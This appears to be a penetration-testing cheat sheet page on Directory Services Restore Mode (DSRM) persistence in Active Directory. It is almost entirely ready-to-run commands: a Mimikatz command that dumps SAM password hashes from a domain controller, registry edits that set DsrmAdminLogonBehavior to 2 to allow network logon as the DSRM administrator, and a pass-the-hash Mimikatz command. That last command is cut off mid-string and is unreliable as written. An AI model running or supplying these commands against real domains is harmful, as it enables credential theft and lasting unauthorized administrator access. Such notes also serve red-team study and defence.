---
description: Directory Services Restore Mode
---

# DSRM

**Dump DSRM password - dumps local users**

look for the local administrator password

```
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
```



**Change login behavior for the local admin on the DC**

```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```



**If property already exists**

```
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```



**Pass the hash for local admin**

```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powers
```
